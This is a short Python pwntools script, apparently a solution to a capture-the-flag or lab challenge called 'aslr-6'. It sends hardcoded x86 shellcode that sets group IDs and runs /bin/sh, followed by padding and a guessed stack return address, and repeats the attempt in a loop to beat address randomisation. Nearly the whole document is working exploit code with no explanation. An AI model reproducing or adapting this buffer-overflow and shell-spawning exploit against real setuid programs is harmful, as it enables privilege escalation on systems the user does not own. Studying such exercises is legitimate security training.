from pwn import *
from time import sleep

e = ELF('./aslr-6')
p = process('./aslr-6')

shellcode = "\xb82\x00\x00\x00\xcd\x80\x99\x89\xc3\x89\xc1\xb8G\x00\x00\x00\xcd\x80\xb8\x0b\x00\x00\x001\xdbj\x00hn/shh//bi\x89\xe3\xb9\x00\x00\x00\x00\x89\xca\xcd\x80"

while 1:
	p = process('./aslr-6')
	p.recv(0x100)
	exploit = shellcode
	exploit += "A" * (0x88 - len(shellcode))
	exploit += "B" * 4
	exploit += p32(0xbfc16f70)
	p.send(exploit)
	#p.recv(100)
	sleep(0.01)
	data = p.recv(100)
	p.interactive()
	p.wait()
	p.close()

